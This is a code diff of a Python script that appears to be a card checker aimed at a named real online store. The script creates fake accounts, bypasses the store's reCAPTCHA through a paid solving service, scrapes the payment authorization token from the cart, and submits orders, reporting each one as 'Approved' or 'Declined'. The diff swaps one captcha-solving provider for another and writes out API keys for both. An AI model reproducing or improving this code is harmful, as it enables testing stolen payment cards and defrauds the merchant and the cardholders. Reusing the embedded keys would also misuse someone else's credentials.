@@ -16,33 +16,35 @@ def paserX(data, first, last):
   except ValueError:
     return None  
 
-api_key = 'CAP-67353EC3E4DFB872C3C8161C3BF5CC189BBFE1785788306C20D66BFB6DD51F4C'
+# CaptchaAI Configuration
+CAPTCHAAI_KEY = 'okrzovimon1mv5kkiviljc5ml9dok0cw'
 
-def capsolver(site_key,site_url,type):
-    payload = {
-        "clientKey": api_key,
-        "task": {
-            "type": type,
-            "websiteKey": site_key,
-            "websiteURL": site_url
-        }
-    }
+def solve_captcha(site_key, site_url):
     try:
-        res = requests.post("https://api.capsolver.com/createTask", json=payload, timeout=30)
-        resp = res.json()
-        task_id = resp.get("taskId")
+        # Create Task
+        create_url = f"https://api.captchaai.com/createTask"
+        payload = {
+            "clientKey": CAPTCHAAI_KEY,
+            "task": {
+                "type": "NoCaptchaTaskProxyless",
+                "websiteURL": site_url,
+                "websiteKey": site_key
+            }
+        }
+        res = requests.post(create_url, json=payload, timeout=30)
+        task_id = res.json().get("taskId")
         if not task_id:
             return None
 
-        for _ in range(20): # max 60 seconds
+        # Poll for Result
+        result_url = f"https://api.captchaai.com/getTaskResult"
+        for _ in range(30): # max 90 seconds
             time.sleep(3)
-            payload = {"clientKey": api_key, "taskId": task_id}
-            res = requests.post("https://api.capsolver.com/getTaskResult", json=payload, timeout=30)
+            res = requests.post(result_url, json={"clientKey": CAPTCHAAI_KEY, "taskId": task_id}, timeout=30)
             resp = res.json()
-            status = resp.get("status")
-            if status == "ready":
-                return resp.get("solution", {}).get('gRecaptchaResponse')
-            if status == "failed" or resp.get("errorId"):
+            if resp.get("status") == "ready":
+                return resp.get("solution", {}).get("gRecaptchaResponse")
+            if resp.get("status") == "failed":
                 return None
     except:
         return None
@@ -79,10 +81,8 @@ class payflowchgr:
             # 3. Visit shopping cart to get token
             cart_resp = session.get('https://www.anfittingsdirect.com/shopping_cart.php', headers=headers, timeout=30).text
             
-            # Improved regex for authorization token
             match = re.search(r"authorization:\s*'([^']+)'", cart_resp)
             if not match:
-                # Try alternative regex
                 match = re.search(r"client_token:\s*'([^']+)'", cart_resp)
                 
             if not match:
@@ -95,13 +95,12 @@ class payflowchgr:
                 json_data = json.loads(decode_string)   
                 bearer = json_data.get('authorizationFingerprint')
             except:
-                # If decoding fails, maybe it's already the bearer or a different format
                 bearer = token
 
             # 4. Captcha & Create Account
-            cap = capsolver('6Le8uk8UAAAAAKmSdQU9NjX37lzlRdkZVvaa43nY', 'https://www.anfittingsdirect.com/create_account.php', 'ReCaptchaV2TaskProxyLess')
+            cap = solve_captcha('6Le8uk8UAAAAAKmSdQU9NjX37lzlRdkZVvaa43nY', 'https://www.anfittingsdirect.com/create_account.php')
             if not cap:
-                return "Error", "Captcha solving failed"
+                return "Error", "CaptchaAI solving failed"
 
             data = f'action=process&firstname=ldfl&lastname=dsdasd&street_address=calle3&suburb=sadw&city=Ciudad+de+M%E9xico&state=43&postcode=10080&country=223&telephone=%2B10989861371&email_address={CorreoRand}&password=leito132asd&confirmation=leito132asd&g-recaptcha-response={cap}'
             session.post('https://www.anfittingsdirect.com/create_account.php', headers=headers, data=data, timeout=30)
@@ -149,7 +148,6 @@ class payflowchgr:
             if "Your order has been processed" in final_resp or "Thank you" in final_resp:
                 return "Approved! ✅", "Transaction Successful"
             
-            # Extract error message
             err_msg = paserX(final_resp, 'class="messageStackError">', '</td>')
             if not err_msg:
                 err_msg = "Declined"
